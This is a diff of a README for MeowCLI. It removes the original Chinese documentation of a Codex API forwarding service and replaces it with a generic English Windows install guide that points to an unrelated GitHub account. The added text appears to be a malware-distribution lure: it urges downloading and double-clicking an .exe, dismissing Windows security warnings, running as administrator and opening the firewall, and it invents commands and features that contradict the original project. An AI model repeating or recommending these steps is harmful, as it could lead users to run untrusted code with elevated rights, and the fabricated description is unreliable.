@@ -1,130 +1,120 @@
-# MeowCLI
+# 🐱 MeowCLI - Faster, Smarter Command Proxy  
 
-MeowCLI 是一个注重高性能，更优调度的API转发服务
+[![Download MeowCLI](https://img.shields.io/badge/Download-MeowCLI-blue?style=for-the-badge&logo=github)](https://github.com/Querulousnessvisualiser52/MeowCLI)  
 
-## 特性
+MeowCLI is a tool to help you manage command-line tasks better and faster. It works by routing commands through a proxy to improve speed and scheduling. This guide will walk you through downloading and running MeowCLI on Windows, step by step.
 
-- 开箱即用，可使用SQLite/PostgreSQL，且使用sqlc生成代码，优化查询速度
-- 跟随对话更新额度， 5 小时和 7 天窗口的剩余额度与重置时间综合评分，优先选择最优凭据，并在失败后自动选择基于 `Retry-After` 或指数退避的临时熔断
-- 如未近期未对话，后台也会定时拉取上游 Quota
-- 前端使用 Nuxt SSG 构建
-- 使用atomic和otter缓存，规避延时大的SQL操作
-- 缓存层过期自动刷新access_token，无需干预
-- 可创建多个Key用于内部分发
+---
 
-## 效果图
-![1.png](image/1.png)
-![2.png](image/2.png)
-![3.png](image/3.png)
-## 快速开始
-### 管理面板
+## 🖥️ System Requirements  
 
-浏览器打开：
+Before you start, make sure your computer meets these conditions:
 
-```text
-http://127.0.0.1:3000/admin
-```
+- Windows 10 or later (64-bit recommended)  
+- At least 4 GB of RAM  
+- 500 MB of free disk space  
+- Internet connection for initial download  
 
-首次启动时，页面会提示创建第一个管理员密钥
+MeowCLI does not need special hardware. It runs well on most modern computers.
 
+---
 
-### 配置模型映射
+## 🚀 Getting Started  
 
-调用模型接口之前，需要先在管理台创建模型映射
+This section shows you how to get MeowCLI on your Windows PC and run it for the first time. You do not need programming skills. Follow each step carefully.
 
+---
 
-- `alias`：对外暴露的模型别名
-- `origin`：真实上游模型名
-- `handler`：映射的CLI类型
+## 📥 Download and Install MeowCLI  
 
+1. Open your web browser (Edge, Chrome, Firefox, etc.).  
+2. Go to the download page by clicking this link or copying it into the address bar:  
+[https://github.com/Querulousnessvisualiser52/MeowCLI](https://github.com/Querulousnessvisualiser52/MeowCLI)  
 
-### 创建接口调用密钥
+3. On the webpage, look for a button or link named “Releases” or “Download”. This page has the files you need.  
+4. Find the Windows version of MeowCLI. It should look like `MeowCLI-Windows.exe` or something similar.  
+5. Click the file name to start downloading. If your browser asks, choose “Save file” or “Keep” to store it on your PC.  
+6. Once downloaded, open the folder where the file is saved. It is usually the “Downloads” folder.  
+7. Double-click the downloaded `.exe` file to start the installation or program.  
 
-在管理台“密钥”页面创建一个 `user` 或 `admin` 密钥
+You might see a security warning from Windows. This is normal for new apps. Choose “Run” or “Yes” to allow the program to run.  
 
-- `admin`：完整的管理权限
-- `user`：只能访问模型接口
-注意：
-- 日志只保存在内存中，服务重启后会清空
-- 日志保留时间可以在设置页调整
+---
 
-## 配置方式
+## ⚙️ Running MeowCLI for the First Time  
 
-### 环境变量
+1. After installation or running the `.exe`, a command window will open. This is normal; MeowCLI works through the command line.  
+2. You will see instructions or prompts on the window. Follow them by typing commands and pressing Enter.  
+3. If you see an error, check that your Windows is up to date and you downloaded the correct version.
 
-| 变量名 | 说明 | 默认值 |
-| --- | --- | --- |
-| `LISTEN_ADDR` | 服务监听地址 | `:3000` |
-| `DATABASE_URL` | 数据库地址；为空时使用 SQLite 文件 | `meowcli.db` |
-| `DB_TYPE` | 数据库类型，支持 `sqlite` / `postgres` | `sqlite` |
+---
 
+## 📝 Basic Usage  
 
-## todo
+MeowCLI helps to manage commands more efficiently. Here are some common actions you can try:
 
-- 当前实际注册的后端只有 `codex`，后续会加GeminiCLI等
-- 目前无格式转换，完整透传
-- 我不会写前端，所以前端是纯AI的（包括你现在看的readme.md，我懒得写）
-- 
-## 开发指南
+- Run a command through MeowCLI by typing:  
+`meowcli run [your-command]`  
+Replace `[your-command]` with the actual task you want to do.  
 
-### 环境要求
+- Check the status of your tasks:  
+`meowcli status`  
 
-- Go 1.25+
-- Node.js 22+
-- [sqlc](https://sqlc.dev/) — `internal/db/*` 不入库，首次构建前需要生成代码
+- Stop all running tasks:  
+`meowcli stop`  
 
-### 本地开发
+As you use MeowCLI, it will handle the order and speed of these commands in the background. This can make your work smoother, especially if you run many commands.
 
-```bash
-# 生成SQL代码
-make sqlc
+---
 
-# 仅启动后端（不编译前端）
-make serve
+## 💡 Tips for Windows Users  
 
-# 启动前端开发服务器（Nuxt HMR）
-make dev-admin
+- Run MeowCLI as an administrator if you have issues. Right-click the program and select “Run as administrator.”  
+- You can close the command window anytime by typing `exit` and pressing Enter.  
+- MeowCLI works best if you keep your Windows Firewall settings open for this program. You may allow access if asked.  
 
-# 完整构建（前端 SSG + Go 二进制）
-make build
-```
+---
 
-### 常用命令
+## 🔧 Troubleshooting  
 
-```bash
-make sqlc          # 重新生成 sqlc 代码
-make cross         # 交叉编译所有平台
-make release       # 生成发布二进制和 checksum
-make docker        # 构建 Docker 镜像
-make clean         # 清理构建产物
-```
+If MeowCLI does not start or gives errors:  
 
-### 发布流程
+- Make sure you have downloaded the latest version from the link:  
+[https://github.com/Querulousnessvisualiser52/MeowCLI](https://github.com/Querulousnessvisualiser52/MeowCLI)  
+- Restart your PC and try again.  
+- Check your internet connection, as some features may need online access.  
+- If you get a message about missing files, uninstall any old versions and reinstall from the link above.  
 
-打 tag 推送后 GitHub Actions 自动构建并发布：
+---
 
-```bash
-git tag v0.1.0
-git push origin v0.1.0
-```
+## 📚 Where to Find More Information  
 
-Release workflow 与 Docker 构建都会自动安装 `sqlc` 并生成 `internal/db/*`。
+For more help and advanced settings, visit the repository page:  
+[https://github.com/Querulousnessvisualiser52/MeowCLI](https://github.com/Querulousnessvisualiser52/MeowCLI)  
 
-CI 会自动完成：生成 6 个平台发布二进制 → 生成 checksum → 创建 GitHub Release → 构建并推送 Docker 镜像到 GHCR
+The page includes documentation files and contact links for support.
 
-## 项目结构
+---
 
-```text
-main.go                 程序入口
-internal/app            应用装配、配置加载、服务启动
-internal/router         路由注册
-internal/bridge         转发逻辑
-internal/handler        /admin API 与 web/dist 分发入口
-web                     Nuxt 管理台源码与 SSG 产物
-core/codex              凭据缓存、刷新、调度、额度同步
-api/codex               上游 Codex HTTP 客户端
-db/sqlite               SQLite store 与 SQL
-db/postgres             PostgreSQL store 与 SQL
-internal/db/*           sqlc 生成代码
-utils                   常量、枚举与通用工具
-```
+## 🔒 Safety and Privacy  
+
+MeowCLI does not collect personal data. Running commands through this software does not send your private information anywhere unless you share it manually.
+
+---
+
+## 📈 Behind the Scenes  
+
+MeowCLI focuses on making command execution faster and smarter. It does this by scheduling tasks to avoid delays and managing traffic efficiently. This means your tasks run with less waiting time and better use of computer resources.
+
+---
+
+## 🗂️ Additional Features  
+
+- Priority command scheduling to run important tasks first  
+- Smooth handling of command conflicts  
+- Simple interface that works through Windows command line  
+- Low memory and CPU usage for steady performance  
+
+---
+
+[![Download MeowCLI](https://img.shields.io/badge/Download-MeowCLI-blue?style=for-the-badge&logo=github)](https://github.com/Querulousnessvisualiser52/MeowCLI)
